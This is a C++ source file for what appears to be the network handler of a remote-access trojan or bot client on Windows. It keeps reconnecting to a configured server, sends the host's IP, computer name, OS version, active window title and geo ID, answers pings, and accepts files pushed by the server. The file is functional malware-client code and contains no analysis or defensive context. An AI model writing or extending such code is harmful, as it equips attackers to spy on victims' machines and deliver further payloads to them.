//
// Created by LUNAFE on 2022-02-09.
//

#include "handling.h"

bool Handling::Connected() {
#ifdef DEBUG
    printf("[DEBUG] TRY_CONNECT\n");
#endif
    WSADATA wsa_data;
    WSAStartup(MAKEWORD(2, 2), &wsa_data);

    main::sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (main::sock == -1) {
#ifdef DEBUG
        wprintf(L"[DEBUG] SOCKET_ERROR\n");
#endif
        return 0;
    }

    SOCKADDR_IN in = {};
    in.sin_family = AF_INET;
    in.sin_port = htons(PORT);
    in.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(main::sock, (SOCKADDR *) &in, sizeof(in)) == SOCKET_ERROR) {
#ifdef DEBUG
        printf("[DEBUG] SOCKET_ERROR\n");
#endif
        return false;
    } else {
#ifdef DEBUG
        printf("[DEBUG] SOCKET_GOOD\n");
#endif
        return true;
    }
}

void Handling::PrintInfo(struct INFO *test) {
    wchar_t ip[16];
    wchar_t name[32];
    wchar_t os[16];
    wchar_t title[128];
    wchar_t id[8];

    Util::CharToWchar(ip, test->ip_address);
    Util::CharToWchar(name, test->computer_name);
    Util::CharToWchar(os, test->os_version);
    Util::CharToWchar(title, test->window_title);
    Util::CharToWchar(id, test->geo_id);


    wprintf(L"[DEBUG] ip: %S\n[DEBUG] name: %S\n[DEBUG] os: %S\n[DEBUG] window_title: %S\n[DEBUG] geo_id: %S\n",
            ip, name, os, title, id);
}

void Handling::Handler() {
    WaitConnected();
#ifdef DEBUG
    printf("[DEBUG] Connected!\n");
#endif
    Packet info_packet;
    Util::MakeInfo(&info_packet);
#ifdef DEBUG
    struct INFO *test = (struct INFO *) info_packet.get_data();
    PrintInfo(test);
#endif
    info_packet.Send(main::sock);
    while (true) {
        Packet recevie_packet;
        int result = recevie_packet.Receive(main::sock);
        if (result == -1) {
            Disconnected();
        } else if (result == 0) {
            Packet pong_packet;
            Util::MakePong(&pong_packet);
            if (pong_packet.Send(main::sock) == -1) {
                Disconnected();
            } else {
#ifdef DEBUG
                printf("[DEBUG] PONG_SENT\n");
#endif
            }
        } else if (result == 1) {
#ifdef DEBUG
            wprintf(L"[DEBUG] TRANSFER_THREAD_START\n");
#endif
            FileHandler::ReceiveFileThread();
        }
        Sleep(1000);
    }
}

void Handling::WaitConnected() {
    while (!Handling::Connected()) {
#ifdef DEBUG
        printf("[DEBUG] Connecting...\n");
#endif
        Sleep(5000);
    }
}

void Handling::Disconnected() {
    WaitConnected();
    Packet info_packet;
    Util::MakeInfo(&info_packet);
    info_packet.Send(main::sock);
    return;
}